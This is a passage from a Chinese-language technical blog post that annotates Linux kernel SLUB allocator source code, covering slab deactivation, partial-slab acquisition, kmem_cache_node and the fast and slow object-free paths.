class="keyword">struct</span> <span class="title">page</span> <span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;freelist) &#123;</span><br><span class="line">        stat(s, DEACTIVATE_REMOTE_FREES);</span><br><span class="line">        tail = DEACTIVATE_TO_TAIL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一步：检查 kmem_cache_cpu-&gt;freelist 是否还有空闲对象</span></span><br><span class="line">    <span class="comment">// 如果有，把 kmem_cache_cpu-&gt;freelist 上的空闲对象都插入 page-&gt;freelist</span></span><br><span class="line">    <span class="comment">// 但是留一个在 kmem_cache_cpu-&gt;freelist 上面</span></span><br><span class="line">    <span class="keyword">while</span> (freelist &amp;&amp; (nextfree = get_freepointer(s, freelist))) &#123;</span><br><span class="line">        <span class="type">void</span> *prior;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查内存是否被破坏</span></span><br><span class="line">        <span class="keyword">if</span> (freelist_corrupted(s, page, &amp;freelist, nextfree))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把 kmem_cache_cpu-&gt;freelist 上的空闲对象都插入 page-&gt;freelist 表头</span></span><br><span class="line">        <span class="comment">// 这里是反序插入，kmem_cache_cpu-&gt;freelist 的最后一个对象变成第一个对象</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            prior = page-&gt;freelist;</span><br><span class="line">            counters = page-&gt;counters;</span><br><span class="line">            <span class="comment">// kmem_cache_cpu-&gt;freelist-&gt;next_free_object = prior，可能会加密存储</span></span><br><span class="line">            set_freepointer(s, freelist, prior);</span><br><span class="line">            new.counters = counters;</span><br><span class="line">            <span class="comment">// 这里的 inuse-- 是因为在 kmem_cache_cpu-&gt;freelist 上的空闲对象</span></span><br><span class="line">            <span class="comment">// 对于 slab 来说也算在使用中，重新放回去后，就需要减一</span></span><br><span class="line">            new.inuse--;</span><br><span class="line">            VM_BUG_ON(!new.frozen);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 原子操作 检查 page-&gt;freelist == prior &amp;&amp; page-&gt;couters == couters</span></span><br><span class="line">        <span class="comment">// 通过则 page-&gt;freelist = freelist, page-&gt;counters = new.counters</span></span><br><span class="line">        &#125; <span class="keyword">while</span> (!__cmpxchg_double_slab(s, page,</span><br><span class="line">            prior, counters,</span><br><span class="line">            freelist, new.counters,</span><br><span class="line">            <span class="string">&quot;drain percpu freelist&quot;</span>));</span><br><span class="line"></span><br><span class="line">        freelist = nextfree;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line">    old.freelist = page-&gt;freelist;</span><br><span class="line">    old.counters = page-&gt;counters;</span><br><span class="line">    VM_BUG_ON(!old.frozen);</span><br><span class="line"></span><br><span class="line">    new.counters = old.counters;</span><br><span class="line">    <span class="keyword">if</span> (freelist) &#123;</span><br><span class="line">        <span class="comment">// 插入保留的那个对象</span></span><br><span class="line">        new.inuse--;</span><br><span class="line">        set_freepointer(s, freelist, old.freelist);</span><br><span class="line">        new.freelist = freelist;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        new.freelist = old.freelist;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解冻，解除该 slab 与 CPU 的绑定</span></span><br><span class="line">    new.frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial)</span><br><span class="line">        <span class="comment">// 如果 slab 上没有正在使用的对象且 node slab 足够多了</span></span><br><span class="line">        <span class="comment">// 就把该 slab 释放给 Buddy System</span></span><br><span class="line">        m = M_FREE;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (new.freelist) &#123;</span><br><span class="line">        <span class="comment">// 如果 slab 上有空闲对象，就放到 node slab 链表中</span></span><br><span class="line">        m = M_PARTIAL;</span><br><span class="line">        <span class="keyword">if</span> (!lock) &#123;</span><br><span class="line">            lock = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 加锁，防止被挖去当 cpu slab 了</span></span><br><span class="line">            spin_lock(&amp;n-&gt;list_lock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果 slab 没有空闲对象，放入 kmem_cache_node-&gt;full 链表里</span></span><br><span class="line">        m = M_FULL;</span><br><span class="line">        <span class="keyword">if</span> (kmem_cache_debug_flags(s, SLAB_STORE_USER) &amp;&amp; !lock) &#123;</span><br><span class="line">            lock = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 加锁，防止被挖去当 cpu slab 了</span></span><br><span class="line">            spin_lock(&amp;n-&gt;list_lock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l != m) &#123;</span><br><span class="line">        <span class="keyword">if</span> (l == M_PARTIAL)</span><br><span class="line">            remove_partial(n, page);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l == M_FULL)</span><br><span class="line">            remove_full(s, n, page);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (m == M_PARTIAL)</span><br><span class="line">            <span class="comment">// 添加到 node slab 的链表头（很少添加到链表尾）</span></span><br><span class="line">            add_partial(n, page, tail);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (m == M_FULL)</span><br><span class="line">            <span class="comment">// 添加到 kmem_cache_node-&gt;full 链表头</span></span><br><span class="line">            add_full(s, n, page);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    l = m;</span><br><span class="line">    <span class="comment">// 原子操作 检查 page-&gt;freelist == old.freelist &amp;&amp; page-&gt;couters == old.couters</span></span><br><span class="line">    <span class="comment">// 通过则 page-&gt;freelist = new.freelist, page-&gt;counters = new.counters</span></span><br><span class="line">    <span class="keyword">if</span> (!__cmpxchg_double_slab(s, page,</span><br><span class="line">                old.freelist, old.counters,</span><br><span class="line">                new.freelist, new.counters,</span><br><span class="line">                <span class="string">&quot;unfreezing slab&quot;</span>))</span><br><span class="line">        <span class="comment">// 基本不会再做一次</span></span><br><span class="line">        <span class="keyword">goto</span> redo;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lock)</span><br><span class="line">        spin_unlock(&amp;n-&gt;list_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m == M_PARTIAL)</span><br><span class="line">        stat(s, tail);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (m == M_FULL)</span><br><span class="line">        stat(s, DEACTIVATE_FULL);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (m == M_FREE) &#123;</span><br><span class="line">        stat(s, DEACTIVATE_EMPTY);</span><br><span class="line">        <span class="comment">// 调用链 free_slab -&gt; __free_slab -&gt; __free_pages 释放给 Buddy System</span></span><br><span class="line">        discard_slab(s, page);</span><br><span class="line">        stat(s, FREE_SLAB);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c-&gt;page = <span class="literal">NULL</span>;</span><br><span class="line">    c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>如果 <code>kmem_cache_cpu-&gt;freelist</code> 还有空闲对象，就迁移到 slab 上（一般情况下都没有空闲对象了，这一步直接跳过）</li><li>解除 slab 与 CPU 的绑定 <code>frozen = 0</code></li><li>根据情况移动该 slab<ul><li>如果 slab 没有正在使用的对象（全是空闲对象），而且 node slab 足够多了，就调用 <code>discard_slab-&gt;free_slab-&gt;__free_slab-&gt;__free_pages</code> 释放给 Buddy System</li><li>如果 slab 还有空闲对象，就插入到 node slab 上</li><li>否则说明 slab 没有空闲对象，就插入到 <code>kmem_cache_node-&gt;full</code> 链表头上</li></ul></li><li>最后将 <code>kmem_cache_cpu</code> 的 <code>page</code> 和 <code>freelist</code> 置零</li></ol><h4 id="new-slab-objects"><a href="#new-slab-objects" class="headerlink" title="new_slab_objects"></a><code>new_slab_objects</code></h4><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">new_slab_objects</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">int</span> node, <span class="keyword">struct</span> kmem_cache_cpu **pc)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span> =</span> *pc;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">WARN_ON_ONCE(s-&gt;ctor &amp;&amp; (flags &amp; __GFP_ZERO));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 get_partial 从 node slab 中获取空闲对象</span></span><br><span class="line">freelist = get_partial(s, flags, node, c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有则从 Buddy System 获取新的 slab 作为 cpu slab</span></span><br><span class="line">page = new_slab(s, flags, node);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="keyword">if</span> (c-&gt;page)</span><br><span class="line">flush_slab(s, c);</span><br><span class="line"></span><br><span class="line">freelist = page-&gt;freelist;</span><br><span class="line">page-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLAB);</span><br><span class="line">c-&gt;page = page;</span><br><span class="line">*pc = c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>调用 <code>get_partial</code> 从 node slab 中尝试获取空闲对象，如果有则直接返回</li><li>调用 <code>new_slab</code> 向 Buddy System 申请新的 slab 作为 cpu slab</li><li>返回获取的空闲对象</li></ol><h4 id="get-patial-amp-get-partial-node"><a href="#get-patial-amp-get-partial-node" class="headerlink" title="get_patial &amp; get_partial_node"></a><code>get_patial</code> &amp; <code>get_partial_node</code></h4><p>从 <code>kmem_cache_node</code> 获取空闲对象的核心函数</p><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">get_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> flags, <span class="type">int</span> node,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> kmem_cache_cpu *c)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *object;</span><br><span class="line"><span class="type">int</span> searchnode = node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">searchnode = numa_mem_id();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不出意外就是调用 get_partial_node 获取空闲对象</span></span><br><span class="line">object = get_partial_node(s, get_node(s, searchnode), c, flags);</span><br><span class="line"><span class="keyword">if</span> (object || node != NUMA_NO_NODE)</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还没有就从别的 node 的 node slab 里取</span></span><br><span class="line">    <span class="comment">// 但是一般计算机只有一个 node，所以会直接返回 NULL</span></span><br><span class="line"><span class="keyword">return</span> get_any_partial(s, flags, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">get_partial_node</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> kmem_cache_node *n,</span></span><br><span class="line"><span class="params">                <span class="keyword">struct</span> kmem_cache_cpu *c, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>, *<span class="title">page2</span>;</span></span><br><span class="line">    <span class="type">void</span> *object = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> available = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> objects;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否有 node slab，没有就返回</span></span><br><span class="line">    <span class="keyword">if</span> (!n || !n-&gt;nr_partial)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    spin_lock(&amp;n-&gt;list_lock);</span><br><span class="line">    <span class="comment">// 安全遍历 node slab，中途可以将 page 脱链</span></span><br><span class="line">    list_for_each_entry_safe(page, page2, &amp;n-&gt;partial, slab_list) &#123;</span><br><span class="line">        <span class="type">void</span> *t;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!pfmemalloc_match(page, flags))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 slab 的 freelist 和空闲对象数量（objects）</span></span><br><span class="line">        t = acquire_slab(s, n, page, object == <span class="literal">NULL</span>, &amp;objects);</span><br><span class="line">        <span class="keyword">if</span> (!t)</span><br><span class="line">            <span class="comment">// 该 slab 没有 freelist 则跳过，可能被其他线程抢走，一般不会有这种情况</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算获取的空闲对象总数</span></span><br><span class="line">        available += objects;</span><br><span class="line">        <span class="keyword">if</span> (!object) &#123;</span><br><span class="line">            <span class="comment">// 第一遍 slab 作为 cpu slab</span></span><br><span class="line">            c-&gt;page = page;</span><br><span class="line">            stat(s, ALLOC_FROM_PARTIAL);</span><br><span class="line">            object = t;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 后面则放入 cpu partial slab</span></span><br><span class="line">            put_cpu_partial(s, page, <span class="number">0</span>);</span><br><span class="line">            stat(s, CPU_PARTIAL_NODE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s)</span><br><span class="line">            || available &gt; slub_cpu_partial(s) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment">// 如果获取的空闲对象总数超过限制的一半，则不再放入 cpu partial slab</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock(&amp;n-&gt;list_lock);</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>检查该 node 是否有 node slab，没有则直接返回 NULL</li><li>从头到尾遍历 node slab<ol><li>计算获取的空闲对象总数</li><li>如果是第一遍，将该 slab 作为 cpu slab</li><li>如果是第二遍以上，将该 slab 放入 cpu partial slab</li><li>直到空闲对象总数超过限制的一半</li></ol></li><li>返回 cpu slab 的 <code>freelist</code></li></ol><h4 id="acquire-slab"><a href="#acquire-slab" class="headerlink" title="acquire_slab"></a><code>acquire_slab</code></h4><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">acquire_slab</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> kmem_cache_node *n, <span class="keyword">struct</span> page *page,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> mode, <span class="type">int</span> *objects)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *freelist;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    lockdep_assert_held(&amp;n-&gt;list_lock);</span><br><span class="line"></span><br><span class="line">    freelist = page-&gt;freelist;</span><br><span class="line">    counters = page-&gt;counters;</span><br><span class="line">    new.counters = counters;</span><br><span class="line">    <span class="comment">// 计算空闲对象的数量</span></span><br><span class="line">    *objects = new.objects - new.inuse;</span><br><span class="line">    <span class="keyword">if</span> (mode) &#123;</span><br><span class="line">        <span class="comment">// 分配为 cpu slab</span></span><br><span class="line">        new.inuse = page-&gt;objects;</span><br><span class="line">        new.freelist = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 分配为 cpu partial slab</span></span><br><span class="line">        new.freelist = freelist;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    VM_BUG_ON(new.frozen);</span><br><span class="line">    <span class="comment">// 冻结，将该 slab 绑定到 CPU</span></span><br><span class="line">    new.frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原子操作</span></span><br><span class="line">    <span class="comment">// page-&gt;freelist = new.freelist, page-&gt;counters = new.counters</span></span><br><span class="line">    <span class="keyword">if</span> (!__cmpxchg_double_slab(s, page,</span><br><span class="line">            freelist, counters,</span><br><span class="line">            new.freelist, new.counters,</span><br><span class="line">            <span class="string">&quot;acquire_slab&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 脱链</span></span><br><span class="line">    remove_partial(n, page);</span><br><span class="line">    WARN_ON(!freelist);</span><br><span class="line">    <span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>计算空闲对象的数量</li><li>如果要分配为 cpu slab，设置 <code>inuse</code> 为总对象数量，<code>freelist</code> 设为 <code>NULL</code></li><li>如果要分配为 cpu partial slab，不做变化</li><li>冻结，将该 slab 绑定到 CPU</li><li>将该 slab 从 node slab 中脱链</li><li>返回获取到的 <code>freelist</code></li></ol><p>#todo 对象分配函数调用关系图</p><h4 id="kmem-cache-node"><a href="#kmem-cache-node" class="headerlink" title="kmem_cache_node"></a><code>kmem_cache_node</code></h4><p>每个 node 的后备内存池</p><p>当 CPU 的独占内存池耗尽后，便会尝试从 <code>kmem_cache_node</code> 中尝试分配</p><figure class="highlight c"><figcaption><span>mm/slab.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="type">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>list_lock</code>：保护 <code>partial</code> 和 <code>full</code> 链表的锁</li><li><code>partial</code>：双向链表，连接有部分空闲对象的 slab，这里简称为 node slab</li><li><code>nr_partial</code>：partial slab 的数量</li><li><code>nr_slabs</code>：总的 slab 数量</li><li><code>total_objects</code>：总的对象数量</li><li><code>full</code>：双向链表，连内存完全耗尽的 slab，一般用不到</li></ul><p>#todo <code>kmem_cache_node</code> 与 slab 的联系</p><h3 id="对象释放"><a href="#对象释放" class="headerlink" title="对象释放"></a>对象释放</h3><h4 id="do-slab-free"><a href="#do-slab-free" class="headerlink" title="do_slab_free"></a><code>do_slab_free</code></h4><p>上层接口最终都会调用 <code>do_slab_free</code> 函数来完成内存释放</p><ul><li><code>struct kmem_cache *s</code>：当前 <code>kmem_cache</code></li><li><code>struct page *page</code>：被释放的对象所在的 <code>page</code></li><li><code>void *head</code>：被释放的第一个对象</li><li><code>void *tail</code>：被释放的最后一个对象</li><li><code>int cnt</code>：被释放的对象的个数</li><li><code>unsigned long addr</code>：开启 <code>SLAB_DEBUG_FLAGS</code> 后使用，一般不会使用</li></ul><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">do_slab_free</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params">                <span class="keyword">struct</span> page *page, <span class="type">void</span> *head, <span class="type">void</span> *tail,</span></span><br><span class="line"><span class="params">                <span class="type">int</span> cnt, <span class="type">unsigned</span> <span class="type">long</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *tail_obj = tail ? : head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> tid;</span><br><span class="line"></span><br><span class="line">    memcg_slab_free_hook(s, &amp;head, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确定当前的 cpu slab</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">        c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">    &#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPTION) &amp;&amp;</span><br><span class="line">         unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">    barrier();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断释放的对象是否属于 cpu slab</span></span><br><span class="line">    <span class="keyword">if</span> (likely(page == c-&gt;page)) &#123;</span><br><span class="line">        <span class="comment">// 如果属于，则直接放回 kmem_cache_cpu-&gt;freelist 中，遵循 FILO</span></span><br><span class="line">        <span class="type">void</span> **freelist = READ_ONCE(c-&gt;freelist);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将被释放的最后一个对象接上原 freelist 指向的对象</span></span><br><span class="line">        set_freepointer(s, tail_obj, freelist);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// cpu_slab-&gt;freelist = head, cpu_slab-&gt;tid = next_tid(tid)</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">                s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">                freelist, tid,</span><br><span class="line">                head, next_tid(tid)))) &#123;</span><br><span class="line"></span><br><span class="line">            note_cmpxchg_failure(<span class="string">&quot;slab_free&quot;</span>, s, tid);</span><br><span class="line">            <span class="keyword">goto</span> redo;</span><br><span class="line">        &#125;</span><br><span class="line">        stat(s, FREE_FASTPATH);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 否则调用 __slab_free 函数进入慢释放</span></span><br><span class="line">        __slab_free(s, page, head, tail_obj, cnt, addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>判断释放的对象是否属于 cpu slab</li><li>如果属于，进入快释放，将释放对象插入 <code>kmem_cache_cpu-&gt;freelist</code> 链表头</li><li>如果不属于，调用 <code>__slab_free</code> 函数进入慢释放</li></ol><h4 id="slab-free"><a href="#slab-free" class="headerlink" title="__slab_free"></a><code>__slab_free</code></h4><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 